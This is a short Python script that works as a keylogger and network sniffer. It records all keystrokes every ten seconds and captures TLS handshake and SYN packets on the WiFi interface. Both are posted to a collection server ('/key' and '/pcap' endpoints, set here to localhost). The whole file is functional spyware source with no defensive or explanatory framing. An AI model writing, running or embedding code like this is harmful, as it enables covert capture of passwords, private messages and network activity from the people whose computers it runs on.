import keyboard
import requests as rq
from time import time
from datetime import datetime
import threading
import pyshark
import asyncio

server = "http://localhost:5000"

def sendKeyLog(record):
    timestamp = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
    recordlist = timestamp + " --- "
    for item in record:
        if item.event_type == "down":
            recordlist += item.name
    rs = rq.post(server + "/key", recordlist.encode('utf-8'))
    print("Keylog sent!")

def sniff():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    capture = pyshark.LiveCapture(interface="WiFi", eventloop=loop, bpf_filter="tcp dst port 443 and ((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) or (tcp[13] & 0x02 = 2))")
    capture.sniff(timeout=10)
    packets = [packet for packet in capture._packets]
    capture.close()
    print("Beginning packet message stream...")
    packet_message = ""
    for packet in packets:
        timestamp = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
        timestamp_header = f"\n- - - - - - - - - - - - - - - - - - - - - - - - -\n- DATETIME --- {timestamp} --- DATETIME -\n- - - - - - - - - - - - - - - - - - - - - - - - -\n\n"
        packet_message += timestamp_header + str(packet)
    rs = rq.post(server + "/pcap", packet_message.encode('utf-8'))
    print("End of packet message stream!")

def main():
    ts = datetime.now()
    keyboard.start_recording()
    thread = threading.Thread(target=sniff)
    thread.start()
    while True:
        dt = datetime.now()
        if (dt - ts).total_seconds() > 10:
            record = keyboard.stop_recording()
            sendKeyLog(record)
            ts = datetime.now()
            keyboard.start_recording()
            
        
if __name__=="__main__":
    main()
